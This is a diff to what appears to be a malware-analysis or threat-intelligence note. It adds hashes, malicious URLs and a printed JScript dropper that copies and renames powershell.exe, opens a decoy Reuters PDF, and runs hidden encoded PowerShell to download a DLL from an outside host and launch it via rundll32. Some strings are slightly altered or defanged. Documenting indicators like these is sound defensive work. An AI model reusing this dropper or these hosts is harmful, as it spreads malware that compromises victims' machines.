@@ -7,6 +7,9 @@
 .js be3f466bf9bb52547563899cbf6cb893b86549f08214c3fd3c1e93e913a9804e
 .dll 62f2adbc73cbdde282ae3749aa63c2bc9c5ded8888f23160801db2db851cde8f
 
+.zip 53e70661204df5b827134353c6e977f509539aabe0e06c002bbaa87552f9ef21
+.dll 778b6797bb9c9d2f868d3faaaf6b36ce3f06178c133bb592c5345c95ffb034a9
+
 *************************************************
 
 zip > lnk > curl > dll
@@ -24,6 +27,68 @@ rundll32.exe C:\ProgramData\\LimdD\laminos.dll, HUF_inc_var
 .js script 
 
 var _0x4b = ["\\ProgramData\\", "Scripting.FileSystemObject", "WinHttp.WinHttpRequest.5.1", "WScript.Shell", "GET", "Open", "Send", "Status", "ResponseBody", "ADODB.Stream", "Type", "Write", "Position", "SaveToFile", "Close", "Run", "Ошибка при загрузке: ", "Echo", "C:\\ProgramData\\LimdD", "https://superrrdental.com/H6F/dshjdsjkkd", "C:\\ProgramData\\LimdD\\laminos.dll", "rundll32 ", ", HUF_inc_var"];
+
+*************************************************
+
+var FSO = new ActiveXObject("Scripting.FileSystemObject"), 
+    WSH = new ActiveXObject("WScript.Shell"), 
+    DIR = function(suffix) { return "C:\\ProgramData\\" + suffix; },
+    alpha = DIR("AlphaPath"),
+    beta = DIR("BetaPath"),
+    PS_EXE = ["C:", "Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe"].join("\\");
+
+(function(OP) {
+    OP.modifyDir = function(path) { if (FSO.FolderExists(path)) FSO.DeleteFolder(path); FSO.CreateFolder(path); };
+    OP.performCommand = function(cmd, state, wait) { WSH.Run(cmd, state, wait); };
+    OP.delay = function(time) { WScript.Sleep(time); };
+    
+    (function() {
+        OP.modifyDir(alpha);
+        FSO.CopyFile(PS_EXE, alpha + "\\appRunner.exe", true);
+    })();
+
+    (function() {
+        OP.delay(3000);
+        OP.modifyDir(beta);
+        OP.performCommand("explorer.exe https://reutersinstitute.politics.ox.ac.uk/sites/default/files/2022-06/Digital_News-Report_2022.pdf", 1, false);
+        OP.delay(5000);
+        
+        var cmdPart1 = alpha + '\\';
+        var cmdPart2 = 'appRunner.exe ';
+        var cmdPart3 = '-nop -Ep BYPass -WiN HId -eNc function A($p, s){
+    $d = Join-Path $p $s 
+    return $d
+
+}
+
+function B($u, $p){
+    Invoke-WebRequest -Post -uri $u -OutFile $p 
+}
+
+function C($c){ 
+    iex $c
+}
+$u1 = "https://plawers.]com/TOA/"
+$u2` = [System.Text.Encoding]::UTF8GetString([System.Convert]::FromBase64String("EFKkefkefs="))
+$url = $u1+`$u2
+$d1 = "C:\ProgramData\"
+$d2 = "BotaPath"
+$folder = A $d1 $d2
+$f = "donot.dll"
+$fullPath = A $folder $f
+$cmd1 = "rundll2 3"
+$cmd2 = ", HUE_inc_var"
+$runCommand = $cmd1 + $fullPath + $cmd2
+
+B $url $fullPath
+ C $runCommand=';
+        OP.performCommand(cmdPart1 + cmdPart2 + cmdPart3, 0, true);
+
+        OP.delay(180000);
+        OP.modifyDir(alpha);
+        OP.modifyDir(beta);
+    })();
+})({});
 
 *************************************************
 
@@ -444,6 +509,7 @@ https://zpsc.edu.bd/ieto/?1
 https://superrrdental.com/H6F/dshjdsjkkd
 https://orthodentrics.com/8GE/44dsdsf32342
 https://oloplentex.com/3uqck/UEdedsd3
+https://plawers.com/TOA/
 
 *************************************************
 
